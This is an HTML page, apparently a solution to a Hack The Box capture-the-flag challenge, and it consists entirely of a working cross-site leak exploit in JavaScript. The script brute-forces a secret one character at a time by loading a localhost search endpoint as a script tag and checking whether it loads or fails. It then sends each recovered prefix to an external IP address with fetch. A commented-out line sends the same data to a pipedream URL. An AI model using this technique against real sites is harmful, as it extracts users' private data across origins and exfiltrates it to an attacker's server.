<!DOCTYPE html>
<html>
<head>
  <title>
    exploit testing by ryn0
  </title>
</head>
<body>
  <script>
    const url = "http://127.0.0.1:1337/api/entries/search?q="
    let flag = "HTB{5w33t_ali3ndr3n_0f_" 
    const letters = "}{-=+01234565789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)(@!:><?"
    const tryUrl = async (c)=>{
        return new Promise((res,rej)=>{
          let u = url + flag+c
          let s = document.createElement('script')
          s.src = u
          s.onload = ()=> res(c) 
          s.onerror= ()=> rej(c)
          document.head.appendChild(s)
        })
    }
    const exploit = async()=>{
      while(true){
        for(let c of letters){
          await tryUrl(c).then(res=>{
            flag+=c
            // fetch(`https://eo934paly6g4k8j.m.pipedream.net?flag=${flag}`)
            fetch(`http://117.214.156.170:8883/?flag=${flag}`)
          },rej=>{})
        }
        if (flag.slice(-1) == "}"){
          break
        }
      }
    }
    exploit()

  </script>
</body>
</html>

